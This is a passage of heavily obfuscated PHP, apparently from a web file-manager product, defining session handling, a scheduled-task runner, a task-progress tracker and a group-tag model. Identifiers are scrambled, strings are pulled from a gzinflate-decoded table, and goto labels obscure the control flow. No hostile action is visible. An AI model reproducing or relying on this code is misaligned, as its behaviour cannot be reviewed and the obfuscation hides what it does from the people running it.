$‹ı™ˆ›Ä = $GLOBALS[$½×ä¯ú[6]][$½×ä¯ú[426]]; self::$sessionTime = $‹ı™ˆ›Ä[$½×ä¯ú[1722]]; $éã¬˜íÎ = isset($GLOBALS[$½×ä¯ú[1723]]) ? $GLOBALS[$½×ä¯ú[1723]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($éã¬˜íÎ)) { self::$sessionSign = Cookie::get($éã¬˜íÎ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($éã¬˜íÎ, self::$sessionSign, self::$sessionTime); $ÜƒŒ±¹ = $‹ı™ˆ›Ä[$½×ä¯ú[1724]]; $¤æŸ±àÕ = $‹ı™ˆ›Ä[$ÜƒŒ±¹]; $æ®œÊêØ = $‹ı™ˆ›Ä[$½×ä¯ú[902]]; switch ($ÜƒŒ±¹) { case $½×ä¯ú[21]: self::$handle = Model($½×ä¯ú[903]); break; case $½×ä¯ú[904]: self::$handle = new CacheRedis($¤æŸ±àÕ, $æ®œÊêØ); break; case $½×ä¯ú[905]: self::$handle = new CacheMemcached($¤æŸ±àÕ, $æ®œÊêØ); break; case $½×ä¯ú[232]: $¤æŸ±àÕ[$½×ä¯ú[87]] = $¤æŸ±àÕ[$½×ä¯ú[87]] . $½×ä¯ú[1725]; self::$handle = new CacheFile($¤æŸ±àÕ, $æ®œÊêØ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ü¶¯Ø—° = new self(); return $ü¶¯Ø—°; } public static function getBySign($Ô»¥üñÌ) { $İøçğäÙ = self::$handle->get($Ô»¥üñÌ); $İøçğäÙ = unserialize($İøçğäÙ); return is_array($İøçğäÙ) ? $İøçğäÙ : array(); } public static function setBySign($ş½‹ĞÆ©, $§•ÄÍ®¨) { CacheLock::lock($ş½‹ĞÆ©); self::$handle->set($ş½‹ĞÆ©, serialize($§•ÄÍ®¨), self::$sessionTime); CacheLock::unlock($ş½‹ĞÆ©); } public static function sign($¸‘ÎıÃÔ = false) { if ($¸‘ÎıÃÔ) { self::$sessionSign = $¸‘ÎıÃÔ; } self::init(); return self::$sessionSign; } public static function set($şÚêÛÛ, $íıÆ˜ö» = false) { self::init(); if (is_array($şÚêÛÛ)) { foreach ($şÚêÛÛ as $ù…ŸŒË¾ => $–­¿ÒßŒ) { array_set_value(self::$data, $ù…ŸŒË¾, $–­¿ÒßŒ); } } else { array_set_value(self::$data, $şÚêÛÛ, $íıÆ˜ö»); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¤Ìß –¹ = false) { self::init(); if (!$¤Ìß –¹) { return self::$data; } return array_get_value(self::$data, $¤Ìß –¹); } public static function remove($êŒôŠˆ¯) { self::init(); unset(self::$data[$êŒôŠˆ¯]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÔÕ±ĞšÎ][908])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $şè¦»ô… =& $_SERVER[ÔÕ±ĞšÎ]; if (self::valueGet($şè¦»ô…[824]) != $şè¦»ô…[91]) { return; } if (self::valueGet($şè¦»ô…[1726]) == $şè¦»ô…[91]) { $ß¶°¬ì = self::valueGet($şè¦»ô…[1727]); if (time() - $ß¶°¬ì > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($şè¦»ô…[1726], $şè¦»ô…[91]); self::log($şè¦»ô…[1728] . ACTION . $şè¦»ô…[1729]); Hook::bind($şè¦»ô…[1730], $şè¦»ô…[1731]); $çä¬©úÖ = 0; while (!0) { self::cacheClear(); if (self::valueGet($şè¦»ô…[824]) != $şè¦»ô…[91]) { self::valueSet($şè¦»ô…[1726], $şè¦»ô…[230]); self::log($şè¦»ô…[1732]); die; } $©ºèàşó = time(); if ($©ºèàşó - $çä¬©úÖ >= 60) { self::valueSet(array($şè¦»ô…[1726] => $şè¦»ô…[91], $şè¦»ô…[1727] => $©ºèàşó)); $çä¬©úÖ = $©ºèàşó; } if (!file_exists(USER_SYSTEM . $şè¦»ô…[1733])) { self::valueSet(array($şè¦»ô…[1726] => $şè¦»ô…[230], $şè¦»ô…[824] => $şè¦»ô…[230])); self::log($şè¦»ô…[1734]); die; } $Úé¿Ğ„– = file_get_contents(BASIC_PATH . $şè¦»ô…[1735]); $ù‡´æŒ· = KOD_VERSION . $şè¦»ô…[10] . KOD_VERSION_BUILD; $Ç…š‚ö“ = match_text($Úé¿Ğ„–, $şè¦»ô…[1736]) . $şè¦»ô…[10] . match_text($Úé¿Ğ„–, $şè¦»ô…[1737]); if ($Ç…š‚ö“ != $ù‡´æŒ·) { self::restart(); self::log("\x73\x74\157\x70\x65\144\x2e\133\x76\145\162\163\151\157\156\40\165\160\144\141\164\x65\73{$versionNow}\40\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $è´øïùØ =& $_SERVER[ÔÕ±ĞšÎ]; http_close(); $GLOBALS[$è´øïùØ[1738]] = 1; $_SERVER[$è´øïùØ[1739]] = $è´øïùØ[1740]; $_COOKIE = array(); $GLOBALS[$è´øïùØ[1741]] = 1; $GLOBALS[$è´øïùØ[1742]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ø·£ÒÆ =& $_SERVER[ÔÕ±ĞšÎ]; http_close(); self::valueSet($ø·£ÒÆ[824], $ø·£ÒÆ[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ø·£ÒÆ[1726] => $ø·£ÒÆ[230], $ø·£ÒÆ[824] => $ø·£ÒÆ[91])); self::log($ø·£ÒÆ[1743]); } public static function taskSwitch() { $îÆ¿ ô =& $_SERVER[ÔÕ±ĞšÎ]; $èÆ™œ°Ê = self::valueGet($îÆ¿ ô[824]) == $îÆ¿ ô[91] ? $îÆ¿ ô[230] : $îÆ¿ ô[91]; self::valueSet($îÆ¿ ô[824], $èÆ™œ°Ê); } public static function shutdownEvent() { $Ó¥É•Ò =& $_SERVER[ÔÕ±ĞšÎ]; self::valueSet($Ó¥É•Ò[1726], $Ó¥É•Ò[230]); self::log($Ó¥É•Ò[1744]); } public static function config($¬è°­Î, $œáùÉÚâ) { self::valueSet($_SERVER[ÔÕ±ĞšÎ][824], $¬è°­Î); } private static function taskRunAll() { $¶”çÙÖ =& $_SERVER[ÔÕ±ĞšÎ]; $­»İîËÕ = timeFloat(); $éÚİ‚ƒê = Model($¶”çÙÖ[1745])->listData(); $°Êšâ‹ = count($éÚİ‚ƒê); for ($û‚Ššöí = 0; $û‚Ššöí < $°Êšâ‹; $û‚Ššöí++) { $ ”ëÜ° = $éÚİ‚ƒê[$û‚Ššöí]; if (!$ ”ëÜ°[$¶”çÙÖ[477]] || $ ”ëÜ°[$¶”çÙÖ[1746]] != $¶”çÙÖ[91]) { continue; } if (!self::taskTimeCheck($ ”ëÜ°)) { continue; } self::taskRun($ ”ëÜ°); } Hook::trigger($¶”çÙÖ[1747]); self::taskQueueRun($­»İîËÕ); } private static function taskQueueRun($ì¬–ÀÔ¹) { $Û«†Ñ¿ = 10; while (!0) { $£¦µøØ = TaskQueue::run(); if ($£¦µøØ === !1) { break; } if (timeFloat() - $ì¬–ÀÔ¹ >= $Û«†Ñ¿) { break; } } } private static function taskTimeCheck($Çã¸‡é¨) { $§Ï´Ô²… =& $_SERVER[ÔÕ±ĞšÎ]; $”é€Ó«Ÿ = json_decode($Çã¸‡é¨[$§Ï´Ô²…[206]], !0); $¯Şô§ñ = intval($Çã¸‡é¨[$§Ï´Ô²…[1727]]); $‹ä ŸÔ = strtotime($§Ï´Ô²…[1748] . $”é€Ó«Ÿ[$§Ï´Ô²…[1749]] . $§Ï´Ô²…[1750]) - strtotime($§Ï´Ô²…[1751]); $âæÙú£» = time() - strtotime(date($§Ï´Ô²…[1752]) . $§Ï´Ô²…[1753]); $¦³ıøêœ = $âæÙú£» >= $‹ä ŸÔ && $âæÙú£» <= $‹ä ŸÔ + 3600; switch ($”é€Ó«Ÿ[$§Ï´Ô²…[33]]) { case $§Ï´Ô²…[1754]: if (time() - $¯Şô§ñ < 3600 * 24 * 30) { return !1; } if ($”é€Ó«Ÿ[$§Ï´Ô²…[1754]] == date($§Ï´Ô²…[1755]) && $¦³ıøêœ) { return !0; } break; case $§Ï´Ô²…[1756]: if (time() - $¯Şô§ñ < 3600 * 24 * 7) { return !1; } $„Òò‚… = date($§Ï´Ô²…[1757]) == 0 ? 7 : date($§Ï´Ô²…[1757]); if ($”é€Ó«Ÿ[$§Ï´Ô²…[1756]] == $„Òò‚… && $¦³ıøêœ) { return !0; } break; case $§Ï´Ô²…[1749]: if (time() - $¯Şô§ñ < 3600 * 24) { return !1; } if ($¦³ıøêœ) { return !0; } break; case $§Ï´Ô²…[1758]: if (time() - $¯Şô§ñ >= floatval($”é€Ó«Ÿ[$§Ï´Ô²…[1758]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Œ°Ò¬¯Ä =& $_SERVER[ÔÕ±ĞšÎ]; static $üğÊÏá¿ = 0; $®¡ìì´ = 300; if (!$üğÊÏá¿) { $üğÊÏá¿ = time(); } if (time() - $üğÊÏá¿ < $®¡ìì´) { return; } $üğÊÏá¿ = time(); $º³Şà«» = Model($Œ°Ò¬¯Ä[579])->db($Œ°Ò¬¯Ä[12]); if ($º³Şà«») { $º³Şà«»->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Œ°Ò¬¯Ä[1759], $Œ°Ò¬¯Ä[1760]); die; } } public static function taskRun($šËôà¼) { $¤™×²•¢ =& $_SERVER[ÔÕ±ĞšÎ]; self::log($¤™×²•¢[1761] . $šËôà¼[$¤™×²•¢[477]] . $¤™×²•¢[1762] . $šËôà¼[$¤™×²•¢[32]] . $¤™×²•¢[1763] . $šËôà¼[$¤™×²•¢[1764]]); Model($¤™×²•¢[1745])->run($šËôà¼[$¤™×²•¢[477]]); $Ìó—ŠÆä = timeFloat(); $ùÎ¯¿‰ö = $¤™×²•¢[12]; switch ($šËôà¼[$¤™×²•¢[33]]) { case $¤™×²•¢[384]: $Îûù‡°¨ = url_request($šËôà¼[$¤™×²•¢[1764]], $¤™×²•¢[1498], !1, !1, !1, !1, 10); if ($Îûù‡°¨[$¤™×²•¢[824]]) { $ùÎ¯¿‰ö = strlen($Îûù‡°¨[$¤™×²•¢[1289]]); } break; case $¤™×²•¢[1765]: $ùÎ¯¿‰ö = Hook::apply($šËôà¼[$¤™×²•¢[1764]]); default: break; } Model($¤™×²•¢[1766])->add(array($¤™×²•¢[1767] => $¤™×²•¢[12], $¤™×²•¢[1768] => $¤™×²•¢[230], $¤™×²•¢[33] => $¤™×²•¢[1769] . $šËôà¼[$¤™×²•¢[477]], $¤™×²•¢[1770] => json_encode(array($¤™×²•¢[32] => $šËôà¼[$¤™×²•¢[32]], $¤™×²•¢[1771] => timeFloat() - $Ìó—ŠÆä, $¤™×²•¢[370] => $ùÎ¯¿‰ö)))); $Ëş—øÑ = $ùÎ¯¿‰ö ? $¤™×²•¢[1772] . $ùÎ¯¿‰ö : $¤™×²•¢[12]; self::log($¤™×²•¢[1773] . $šËôà¼[$¤™×²•¢[477]] . $¤™×²•¢[178] . $Ëş—øÑ); return !0; } public static function valueGet($Í°ó®³Â) { $“¤œÅü =& $_SERVER[ÔÕ±ĞšÎ]; $›®µıÔ— = $“¤œÅü[1774]; $Ô‚èÓĞ = Model($“¤œÅü[510])->get($Í°ó®³Â, $›®µıÔ—); if (is_null($Ô‚èÓĞ)) { Model($“¤œÅü[510])->set($“¤œÅü[824], $“¤œÅü[91], $›®µıÔ—); Model($“¤œÅü[510])->set($“¤œÅü[1726], $“¤œÅü[230], $›®µıÔ—); $Ô‚èÓĞ = Model($“¤œÅü[510])->get($Í°ó®³Â, $›®µıÔ—); } return $Ô‚èÓĞ; } private static function valueSet($¢€ò­, $¾‹’´¢ = false) { $Ò˜Í¸ =& $_SERVER[ÔÕ±ĞšÎ]; $ÃÆ¢¹Èœ = $Ò˜Í¸[1775]; CacheLock::lock($ÃÆ¢¹Èœ); $ç¡Æ†ÜÅ = Model($Ò˜Í¸[510])->set($¢€ò­, $¾‹’´¢, $Ò˜Í¸[1774]); CacheLock::unlock($ÃÆ¢¹Èœ); return $ç¡Æ†ÜÅ; } protected static function log($áĞô¡Á¾) { write_log($áĞô¡Á¾, $_SERVER[ÔÕ±ĞšÎ][1760]); } private static function cacheClear() { $ğ§€íàÁ =& $_SERVER[ÔÕ±ĞšÎ]; Cache::clearMemory(Model($ğ§€íàÁ[510])->cacheKey($ğ§€íàÁ[1774])); Cache::clearMemory(Model($ğ§€íàÁ[510])->cacheKey($ğ§€íàÁ[1776])); Model($ğ§€íàÁ[1745])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ºİ±Ì¸, $òö¨‹Å³ = '', $ñÂÄ–¥ä = 0, $¸ü£¹©ß = '') { $‡ç×‹ =& $_SERVER[ÔÕ±ĞšÎ]; if (self::get($ºİ±Ì¸)) { return; } $this->task = array($‡ç×‹[477] => $ºİ±Ì¸, $‡ç×‹[1777] => USER_ID, $‡ç×‹[1665] => $¸ü£¹©ß, $‡ç×‹[528] => $‡ç×‹[12], $‡ç×‹[33] => $òö¨‹Å³, $‡ç×‹[1144] => $‡ç×‹[12], $‡ç×‹[1142] => $ñÂÄ–¥ä, $‡ç×‹[1778] => 0, $‡ç×‹[1779] => 0, $‡ç×‹[1780] => 0, $‡ç×‹[1781] => timeFloat(), $‡ç×‹[1782] => 0, $‡ç×‹[1783] => 0, $‡ç×‹[1784] => 0, $‡ç×‹[1785] => 0, $‡ç×‹[824] => $‡ç×‹[1726]); $GLOBALS[$‡ç×‹[1786]] = 1; Hook::bind($‡ç×‹[1730], array($this, $‡ç×‹[1787])); Hook::bind($‡ç×‹[1788], array($this, $‡ç×‹[1789])); $this->startAfter(); Hook::trigger($‡ç×‹[1790], $this->task); $this->task[$‡ç×‹[1783]] = timeFloat(); } public function end($ñ˜±œìì = '') { $¿Ëñ¬Ÿ› =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¿Ëñ¬Ÿ›[1783]]) { self::valueSet($this->task[$¿Ëñ¬Ÿ›[477]], !1); } $this->isEnd = !0; if ($ñ˜±œìì) { $this->task[$¿Ëñ¬Ÿ›[528]] = $ñ˜±œìì; } self::log($¿Ëñ¬Ÿ›[1791] . $this->task[$¿Ëñ¬Ÿ›[477]] . $¿Ëñ¬Ÿ›[1792] . sprintf($¿Ëñ¬Ÿ›[926], timeFloat() - $this->task[$¿Ëñ¬Ÿ›[1781]]) . $¿Ëñ¬Ÿ›[1793]); Hook::unbind($¿Ëñ¬Ÿ›[1730], array($this, $¿Ëñ¬Ÿ›[1787])); Hook::unbind($¿Ëñ¬Ÿ›[1788], array($this, $¿Ëñ¬Ÿ›[1789])); $this->endAfter(); $úªÉ¹Åª = $this->task; $this->task = !1; Hook::trigger($¿Ëñ¬Ÿ›[1794], $úªÉ¹Åª); } public function update($à²Øµ¿µ = 0, $…ä×ìš = false) { $şÛ›ÛÔĞ =& $_SERVER[ÔÕ±ĞšÎ]; $“ì×¥Ã‚ =& $this->task; if (!$“ì×¥Ã‚) { return; } $“ì×¥Ã‚[$şÛ›ÛÔĞ[1778]] += $à²Øµ¿µ; $“ì×¥Ã‚[$şÛ›ÛÔĞ[1782]] = timeFloat(); if ($“ì×¥Ã‚[$şÛ›ÛÔĞ[1142]]) { if ($“ì×¥Ã‚[$şÛ›ÛÔĞ[1142]] < $“ì×¥Ã‚[$şÛ›ÛÔĞ[1778]]) { $“ì×¥Ã‚[$şÛ›ÛÔĞ[1142]] = $“ì×¥Ã‚[$şÛ›ÛÔĞ[1778]]; } $ŞºÚÆ±Ö = timeFloat() - $“ì×¥Ã‚[$şÛ›ÛÔĞ[1781]] - $“ì×¥Ã‚[$şÛ›ÛÔĞ[1784]]; if ($ŞºÚÆ±Ö <= 0) { $ŞºÚÆ±Ö = 0.001; } $“ì×¥Ã‚[$şÛ›ÛÔĞ[1779]] = $“ì×¥Ã‚[$şÛ›ÛÔĞ[1778]] / $“ì×¥Ã‚[$şÛ›ÛÔĞ[1142]]; $“ì×¥Ã‚[$şÛ›ÛÔĞ[1780]] = $“ì×¥Ã‚[$şÛ›ÛÔĞ[1778]] / $ŞºÚÆ±Ö; if ($“ì×¥Ã‚[$şÛ›ÛÔĞ[1779]] > 0) { $“ì×¥Ã‚[$şÛ›ÛÔĞ[1785]] = $ŞºÚÆ±Ö * (1 - $“ì×¥Ã‚[$şÛ›ÛÔĞ[1779]]) / $“ì×¥Ã‚[$şÛ›ÛÔĞ[1779]]; } $“ì×¥Ã‚[$şÛ›ÛÔĞ[1785]] = $“ì×¥Ã‚[$şÛ›ÛÔĞ[1785]] <= 0 ? 0 : $“ì×¥Ã‚[$şÛ›ÛÔĞ[1785]]; } $this->updateAfter(); $ß¿¿§ˆå = 0.2; if (timeFloat() - $“ì×¥Ã‚[$şÛ›ÛÔĞ[1783]] < $ß¿¿§ˆå && !$…ä×ìš) { return; } $±ˆÀ¹¶¬ = self::get($“ì×¥Ã‚[$şÛ›ÛÔĞ[477]]); $©èŸü… = $±ˆÀ¹¶¬[$şÛ›ÛÔĞ[824]]; if ($©èŸü… == self::STATYS_KILL) { $ì•àüÚ = array($şÛ›ÛÔĞ[1795] => LNG($şÛ›ÛÔĞ[1796]), $şÛ›ÛÔĞ[1299] => !1); Cache::set($şÛ›ÛÔĞ[1797] . $this->task[$şÛ›ÛÔĞ[477]], $ì•àüÚ, 30); $this->onKill(); $this->end(); die; } else { if ($©èŸü… == self::STATYS_STOP) { $Šó”é˜È = 2; $±ˆÀ¹¶¬[$şÛ›ÛÔĞ[1784]] += $Šó”é˜È; self::valueSet($“ì×¥Ã‚[$şÛ›ÛÔĞ[477]], $±ˆÀ¹¶¬); sleep($Šó”é˜È); $this->update(); return; } } $“ì×¥Ã‚[$şÛ›ÛÔĞ[824]] = $©èŸü… ? $©èŸü… : $“ì×¥Ã‚[$şÛ›ÛÔĞ[824]]; $“ì×¥Ã‚[$şÛ›ÛÔĞ[1784]] = $±ˆÀ¹¶¬[$şÛ›ÛÔĞ[1784]] ? $±ˆÀ¹¶¬[$şÛ›ÛÔĞ[1784]] : 0; $“ì×¥Ã‚[$şÛ›ÛÔĞ[1783]] = timeFloat(); Hook::trigger($şÛ›ÛÔĞ[1798], $“ì×¥Ã‚); self::valueSet($“ì×¥Ã‚[$şÛ›ÛÔĞ[477]], $“ì×¥Ã‚); } public function onKillSet($ÆÔã¶·, $Ò…÷¶¬í = array()) { $this->onKillCall = array($ÆÔã¶·, $Ò…÷¶¬í); } public function onKill() { $­ØªïÏ· =& $_SERVER[ÔÕ±ĞšÎ]; self::log($­ØªïÏ·[1791] . $this->task[$­ØªïÏ·[477]] . $­ØªïÏ·[1799]); Hook::trigger($­ØªïÏ·[1800], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¥ò²Æ) { $ÏãàİÈÓ =& $_SERVER[ÔÕ±ĞšÎ]; Cache::set($ÏãàİÈÓ[1797] . $this->task[$ÏãàİÈÓ[477]], $¥ò²Æ, 60); if (!is_array($¥ò²Æ) || !$¥ò²Æ[$ÏãàİÈÓ[1299]]) { self::log($ÏãàİÈÓ[1801] . json_encode($¥ò²Æ)); } return $¥ò²Æ; } public static function get($•ÄÖ¬å”) { $Ã±Ù¯ø’ =& $_SERVER[ÔÕ±ĞšÎ]; $Ü¸¤­É¹ = self::valueGet($•ÄÖ¬å”); if (is_array($Ü¸¤­É¹) && $Ü¸¤­É¹[$Ã±Ù¯ø’[1802]]) { $×úü¶©ğ = ActionApply($Ü¸¤­É¹[$Ã±Ù¯ø’[1802]], array($Ü¸¤­É¹)); $Ü¸¤­É¹ = is_array($×úü¶©ğ) ? $×úü¶©ğ : $Ü¸¤­É¹; } return $Ü¸¤­É¹; } public static function listData() { $¢¬”Æ­· = self::valueGet(); return array_sort_by($¢¬”Æ­·, $_SERVER[ÔÕ±ĞšÎ][1781], !0); } public static function kill($ßÕÍ››) { return self::changeStatus($ßÕÍ››, self::STATYS_KILL); } public static function stop($âºÇôÇ) { return self::changeStatus($âºÇôÇ, self::STATYS_STOP); } public static function restart($€Ãşàêµ) { return self::changeStatus($€Ãşàêµ, self::STATYS_RUNNING); } public static function killAll() { $º“İÊÉˆ =& $_SERVER[ÔÕ±ĞšÎ]; $çÒ‹ØŞ  = self::listData(); foreach ($çÒ‹ØŞ  as $¼Â¤±ù) { self::kill($¼Â¤±ù[$º“İÊÉˆ[477]]); } sleep(2); foreach ($çÒ‹ØŞ  as $¼Â¤±ù) { self::valueSet($¼Â¤±ù[$º“İÊÉˆ[477]], !1); } } private static function changeStatus($£¾û¿¾ö, $ÄŠí¬Àî) { $İ¬©¦ğá =& $_SERVER[ÔÕ±ĞšÎ]; $³ò¤ğáá = self::valueGet($£¾û¿¾ö); if (!$³ò¤ğáá) { return !1; } $³ò¤ğáá[$İ¬©¦ğá[824]] = $ÄŠí¬Àî; self::valueSet($£¾û¿¾ö, $³ò¤ğáá); self::log($İ¬©¦ğá[1803] . $³ò¤ğáá[$İ¬©¦ğá[477]] . $İ¬©¦ğá[1804] . $ÄŠí¬Àî); return !0; } public static function valueGet($ŒÅ…ñ×á = false) { $÷ÕŠÓ…¸ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ŒÅ…ñ×á) { $®ªô©¹è = Model($÷ÕŠÓ…¸[522])->where(array($÷ÕŠÓ…¸[97] => $ŒÅ…ñ×á, $÷ÕŠÓ…¸[33] => $÷ÕŠÓ…¸[1151]))->find(); return $®ªô©¹è ? json_decode($®ªô©¹è[$÷ÕŠÓ…¸[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($—şñùú˜ = false) { $ÉœÔşº =& $_SERVER[ÔÕ±ĞšÎ]; $ĞÓ¶‰şã = array($ÉœÔşº[33] => $ÉœÔşº[1151]); if ($—şñùú˜) { $ĞÓ¶‰şã[$ÉœÔşº[1777]] = $—şñùú˜; } $çóççî² = Model($ÉœÔşº[522])->where($ĞÓ¶‰şã)->select(); $çóççî² = $çóççî² ? $çóççî² : array(); foreach ($çóççî² as $²©ÌÂÍ => $¼ûäå–‚) { $çóççî²[$²©ÌÂÍ] = json_decode($¼ûäå–‚[$ÉœÔşº[452]], !0); } return $çóççî²; } public static function valueSet($ı˜™Ïšª, $Èù¹ìıó) { $±íõ•Û =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Èù¹ìıó) { return Model($±íõ•Û[522])->where(array($±íõ•Û[97] => $ı˜™Ïšª, $±íõ•Û[33] => $±íõ•Û[1151]))->delete(); } $Í°•·Ç = json_encode($Èù¹ìıó); if (!$Í°•·Ç) { ob_start(); var_dump($Èù¹ìıó); $Ô©“˜Î’ = ob_get_clean(); self::log($±íõ•Û[1805] . json_encode_force($Ô©“˜Î’)); } if (!$ı˜™Ïšª || !$Èù¹ìıó[$±íõ•Û[477]]) { return !1; } $…ÇÀ†Î = array($±íõ•Û[33] => $±íõ•Û[1151], $±íõ•Û[1777] => USER_ID, $±íõ•Û[97] => $ı˜™Ïšª, $±íõ•Û[452] => $Í°•·Ç); $¤½åÙ‘Ç = $±íõ•Û[1806]; CacheLock::lock($¤½åÙ‘Ç); Model($±íõ•Û[522])->add($…ÇÀ†Î, array(), !0); CacheLock::unlock($¤½åÙ‘Ç); } public static function log($¯úµ’ë) { if (!GLOBAL_DEBUG) { return; } write_log($¯úµ’ë, $_SERVER[ÔÕ±ĞšÎ][1807]); } } goto dËÅâ‡¯šô; c‰ÔÚø”›: if (!$saqjntdmhu) { die; } $_SERVER[ü¢¡ã”ä] = explode($_SERVER[ÔÕ±ĞšÎ][685], gzinflate(substr($_SERVER[ÔÕ±ĞšÎ][686], 10, -8))); $wdueljoskc = $_SERVER[ÔÕ±ĞšÎ][687]; goto d•éï¬´¦; DÆ÷˜‰¢: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($øöú±£¯) { $ƒ§×îİœ =& $_SERVER[ÔÕ±ĞšÎ]; return array($ƒ§×îİœ[2092] => array($øöú±£¯[0], $ƒ§×îİœ[2093]), $ƒ§×îİœ[2094] => array($øöú±£¯[0], $ƒ§×îİœ[2095])); } protected function get($Ñßò¿) { $Ì¿À˜Ñì =& $_SERVER[ÔÕ±ĞšÎ]; $…øÑõ = Model($Ì¿À˜Ñì[587])->metaGet($Ñßò¿, $Ì¿À˜Ñì[2096]); $‘‡À¤¦˜ = json_decode($…øÑõ, !0); return $‘‡À¤¦˜ ? $‘‡À¤¦˜ : array($Ì¿À˜Ñì[2097] => $Ì¿À˜Ñì[91], $Ì¿À˜Ñì[447] => array()); } protected function set($Â®Úæ”±, $§—ú¢) { $ÒÅÄÃ¥Ô =& $_SERVER[ÔÕ±ĞšÎ]; $§—ú¢ = $§—ú¢ ? $§—ú¢ : array($ÒÅÄÃ¥Ô[2097] => $ÒÅÄÃ¥Ô[91], $ÒÅÄÃ¥Ô[447] => array()); return Model($ÒÅÄÃ¥Ô[587])->metaSet($Â®Úæ”±, $ÒÅÄÃ¥Ô[2096], json_encode($§—ú¢)); } protected function getByTagID($…¨¯±¬ì, $”®–¯å·) { $íÁİË¯ñ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$…¨¯±¬ì || !$”®–¯å·) { return !1; } if (!Model($íÁİË¯ñ[587])->getInfoSimple($…¨¯±¬ì)) { return !1; } $÷˜š”çÛ = $this->get($…¨¯±¬ì); if (!$÷˜š”çÛ || !isset($÷˜š”çÛ[$íÁİË¯ñ[447]])) { return !1; } $ØÁËºÂÊ = array_find_by_field($÷˜š”çÛ[$íÁİË¯ñ[447]], $íÁİË¯ñ[477], $”®–¯å·); return is_array($ØÁËºÂÊ) ? $ØÁËºÂÊ : !1; } public function listSource($–™¸èŒ, $ÅğàÄ¥ä) { $ÊÚ×ã÷ =& $_SERVER[ÔÕ±ĞšÎ]; if ($ÅğàÄ¥ä && !is_array($ÅğàÄ¥ä)) { $ÅğàÄ¥ä = array($ÅğàÄ¥ä); } $¸÷©„øœ = $this->listData($–™¸èŒ); $¸ÈäÕÓñ = array(); foreach ($¸÷©„øœ as $è–Âå·) { $ÅÛßÈÂù = $è–Âå·[$ÊÚ×ã÷[87]]; if (!$ÅÛßÈÂù) { continue; } if (!isset($¸ÈäÕÓñ[$ÅÛßÈÂù])) { $¸ÈäÕÓñ[$ÅÛßÈÂù] = array(); } $¸ÈäÕÓñ[$ÅÛßÈÂù][] = $è–Âå·[$ÊÚ×ã÷[502]]; } $À°î‹©£ = array(); foreach ($¸ÈäÕÓñ as $ŸÉ›± => $¬ù‘¹ı) { $³ „ˆšÜ = !0; if (!$ÅğàÄ¥ä) { $À°î‹©£[] = $ŸÉ›±; continue; } foreach ($ÅğàÄ¥ä as $ÙøßÑ“) { if (!in_array($ÙøßÑ“, $¬ù‘¹ı)) { $³ „ˆšÜ = !1; break; } } if ($³ „ˆšÜ) { $À°î‹©£[] = $ŸÉ›±; } } if (!$À°î‹©£) { return array(); } $€¢„Ú—· = array($ÊÚ×ã÷[493] => array($ÊÚ×ã÷[494], $À°î‹©£), $ÊÚ×ã÷[571] => $–™¸èŒ, $ÊÚ×ã÷[190] => SourceModel::TYPE_GROUP); $£È¸Áå = Model($ÊÚ×ã÷[1423])->listSource($€¢„Ú—·); if (!$£È¸Áå || count($À°î‹©£) == $£È¸Áå[$ÊÚ×ã÷[444]][$ÊÚ×ã÷[445]]) { return $£È¸Áå; } $ó¼Şôë´ = array(); $™· æ = array_to_keyvalue($£È¸Áå[$ÊÚ×ã÷[85]], $ÊÚ×ã÷[12], $ÊÚ×ã÷[193]); $Íë§ùµï = array_to_keyvalue($£È¸Áå[$ÊÚ×ã÷[86]], $ÊÚ×ã÷[12], $ÊÚ×ã÷[193]); $ÁŒ¤î = array_merge($Íë§ùµï, $™· æ); foreach ($À°î‹©£ as $ÅÛßÈÂù) { if (!in_array($ÅÛßÈÂù, $ÁŒ¤î)) { $ó¼Şôë´[] = $ÅÛßÈÂù; } } if ($ó¼Şôë´) { $this->removeBySource($–™¸èŒ, $ó¼Şôë´); } return $£È¸Áå; } protected function listData($Øåµ­×Ç) { $¤‹åÉÕÂ =& $_SERVER[ÔÕ±ĞšÎ]; $¤Ñ…°áé = array($¤‹åÉÕÂ[1768] => 0, $¤‹åÉÕÂ[559] => array($¤‹åÉÕÂ[2098], 0), $¤‹åÉÕÂ[498] => $¤‹åÉÕÂ[2099] . $Øåµ­×Ç); $°ú°’ËÏ = $¤‹åÉÕÂ[2100]; $¾½¸²ŠÕ = $this->field($°ú°’ËÏ)->where($¤Ñ…°áé)->order($¤‹åÉÕÂ[2101])->select(); return $¾½¸²ŠÕ ? $¾½¸²ŠÕ : array(); } protected function addToTag($ğßÌëà§, $òÌ©ºÙ„, $»é ²¶Ã) { $Áá¢òœñ =& $_SERVER[ÔÕ±ĞšÎ]; 